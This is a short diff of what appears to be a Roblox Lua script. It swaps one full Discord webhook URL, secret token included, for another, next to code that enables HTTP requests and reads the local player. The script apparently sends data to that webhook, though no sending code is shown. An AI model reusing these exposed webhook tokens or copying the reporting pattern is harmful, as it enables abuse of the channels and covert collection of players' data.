@@ -6,7 +6,7 @@ local UserInputService = game:GetService("UserInputService")
 
 HttpService.HttpEnabled = true
 
-local webhook = "https://discord.com/api/webhooks/1378714602224750654/AYogB1ijtuKv5aCkbs3pZIudWUQwNCnQvq0z5HKiPd8bxhZuLJsWjuYHvB2xPz-rSTvU"
+local webhook = "https://discord.com/api/webhooks/1381251312011706378/134JwMQdsYrwysoX6s6y42X0Ufx3tUHN7FcQhorvpyG-xenyFMIf43PuRWcnZirrwQnC"
 local player = Players.LocalPlayer
 
 local function safeGet(func, default)
